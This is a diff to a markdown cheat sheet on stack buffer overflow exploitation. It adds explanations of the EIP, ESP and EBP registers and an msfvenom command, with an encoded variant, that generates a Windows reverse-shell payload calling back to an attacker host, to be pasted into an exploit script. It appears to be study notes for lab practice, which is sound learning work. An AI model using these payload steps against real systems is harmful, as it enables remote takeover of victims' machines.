@@ -2,6 +2,19 @@
 
 ## Registers
 
+### EIP
+
+**Extended Instruction Pointer**
+Register for the next command, e.g. jump back address. If you can overwrite the EIP you can control where to jump next
+
+### ESP
+**Extended Stack Pointer**
+Register contains the value of the last address which was pushed to the stack. ESP ist the top point of the stack. There we can address our shellcode.
+
+### EBP
+**Extended Base Stack Pointer**
+Register contains the first address of a stack. This one is dynamic and had to be definded. 
+
 ## nasm
 
 Get opcode: 
@@ -34,7 +47,6 @@ Compare bytearray with bytes in stack
 Find jump esp
 !mona jmp -r esp -cpb "<all bad chars>"
 ```
-
 
 ## Fuzzing
 
@@ -142,6 +154,9 @@ e.g. \x01\x02\x03\x04 in Immunity, write it as \x04\x03\x02\x01 in your exploit
 
 ```console
 $ msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "<all bad chars>" -f c
+
+With encoding
+$ msfvenom -p windows/shell_reverse_tcp LHOST=YOUR_IP LPORT=4444 EXITFUNC=thread -b "<all bad chars>" -f c x86/shikata_ga_nai
 ```
 
 Copy generated C string without semicolon to exploit.py under payload
